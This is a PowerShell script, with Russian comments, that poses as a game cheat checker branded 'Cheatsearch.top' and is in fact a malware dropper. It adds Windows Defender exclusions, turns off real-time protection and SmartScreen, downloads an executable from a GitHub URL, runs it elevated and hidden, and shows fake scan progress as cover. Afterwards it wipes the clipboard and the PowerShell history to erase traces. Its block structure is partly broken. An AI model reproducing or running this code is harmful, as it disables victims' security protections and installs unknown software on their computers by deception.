$ErrorActionPreference = "SilentlyContinue"
Clear
Write-Host "--- Debug Mode: Cheatsearch.top ---" -ForegroundColor Yellow

Write-Host "Cheatsearch.top - Best cheat searcher!" -ForegroundColor Cyan

# 1. Настройка путей (Используем TEMP, чтобы точно были права на запись)
$outputFile = "$env:TEMP\ccmmd.exe"
$folderPath1 = "C:\Windows\Temp"
$folderPath2 = "C:\"
$folderPath3 = "C:\ProgramData"
$userPath = "C:\Users"

# 2. Попытка добавить исключения в Defender (нужны права админа)
Add-MpPreference -ExclusionPath $userPath, $folderPath1, $folderPath2, $folderPath3, $outputFile
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableAutoExclusions $true
# 1. Проверка прав администратора
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ОШИБКА: Скрипт запущен БЕЗ прав администратора!" -ForegroundColor Red
    Write-Host "[!] Запустите PowerShell от имени администратора." -ForegroundColor Yellow
}

# Отключаем SmartScreen через реестр
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD
# 2. Настройка путей (используем TEMP для надежности записи)
$outputFile = "$env:TEMP\ccmmd.exe" 
Write-Host "[+] Путь для сохранения: $outputFile" -ForegroundColor Gray

# 3. Скачивание файла с правильным User-Agent
# 3. Попытка скачивания
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
$webClient = New-Object System.Net.WebClient
# Стандартный заголовок браузера, чтобы GitHub не блокировал запрос
$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
Write-Host "[*] Начинаю скачивание..." -ForegroundColor Cyan

try {
    $webClient = New-Object System.Net.WebClient
    # Упростим User-Agent, чтобы GitHub не счел его подозрительным
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($url, $outputFile)
    Write-Host "[+] Файл успешно скачан." -ForegroundColor Green
} catch {
    Write-Host "Download failed!" -ForegroundColor Red
    Write-Host "[-] ОШИБКА СКАЧИВАНИЯ: $($_.Exception.Message)" -ForegroundColor Red
}

# 4. Запуск EXE (с правами админа и скрыто)
# 4. Проверка наличия файла перед запуском
if (Test-Path $outputFile) {
    Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle Hidden
}

# 5. Визуальная часть (Твои проценты)
$tasks = @(
    @{ name = "Checking gamefiles"; speed = 50 },
    @{ name = "Checking regedit"; speed = 150 },
    @{ name = "Checking LastActivity"; speed = 20 },
    @{ name = "Checking files"; speed = 120 }
)

foreach ($task in $tasks) {
    for ($i = 1; $i -le 100; $i++) {
        Write-Host -NoNewline ("$($task.name): $i% `r")
        Start-Sleep -Milliseconds $task.speed
    Write-Host "[*] Попытка запуска файла..." -ForegroundColor Cyan
    try {
        # Пробуем запустить и ждем немного, чтобы увидеть, не вылетит ли ошибка
        $process = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -ErrorAction Stop
        Write-Host "[+] Процесс запущен (ID: $($process.Id))" -ForegroundColor Green
    } catch {
        Write-Host "[-] ОШИБКА ЗАПУСКА: $($_.Exception.Message)" -ForegroundColor Red
    }
    Write-Host ("$($task.name): Complete!      ") -ForegroundColor DarkGreen
} else {
    Write-Host "[-] ОШИБКА: Файл не найден на диске, запуск невозможен." -ForegroundColor Red
}

Write-Host "`nCheat check end!" -ForegroundColor Green
Write-Host "Visit cheatseach.top!" -ForegroundColor Cyan

# 6. Очистка следов (Буфер, История PowerShell)
Add-Type -AssemblyName PresentationCore
[System.Windows.Clipboard]::Clear()

try {
    $clipboardHistoryPath = "HKCU:\Software\Microsoft\Clipboard"
    if (Test-Path $clipboardHistoryPath) {
        Remove-Item -Path $clipboardHistoryPath -Recurse -Force
    }
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) { Remove-Item $historyPath -Force }
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
} catch {}
Write-Host "--- Конец проверки ---" -ForegroundColor Yellow
pause
